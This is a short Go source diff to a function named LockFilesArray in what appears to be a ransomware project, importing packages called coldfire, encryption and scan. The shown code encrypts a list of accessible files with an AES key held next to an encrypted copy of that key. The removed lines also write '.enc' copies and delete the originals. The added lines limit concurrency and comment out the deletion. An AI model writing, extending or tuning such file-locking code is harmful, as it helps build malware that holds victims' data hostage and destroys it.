@@ -9,6 +9,7 @@ import (
 	cf "frostbite.com/coldfire"
 	enc "frostbite.com/encryption"
 	scan "frostbite.com/tools/scan"
+	"github.com/zenthangplus/goccm"
 )
 
 var pl = fmt.Println
@@ -73,17 +74,21 @@ func GetListOfAccessibleFiles(fileList []string) []string {
 
 func LockFilesArray(filesToEncrypt []string, AESKey []byte, encryptedAESKey []byte) {
 	//scan only non hidden directories
-	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
+
+	runtime.GOMAXPROCS(2)
+	c := goccm.New(4)
 
 	wg := sync.WaitGroup{}
 	wg.Add(len(filesToEncrypt))
 
 	for _, filePath := range filesToEncrypt {
 		go func(filePath string) {
-			encryptedFileData := enc.EncryptFileAES(AESKey, filePath)
-			os.WriteFile(filePath+".enc", encryptedFileData, 0644)
-			os.Remove(filePath)
+			enc.EncryptFileAES(AESKey, filePath)
+
+			// os.Remove(filePath)
 			wg.Done()
+			c.Done()
+			return
 		}(filePath)
 	}
 	wg.Wait()
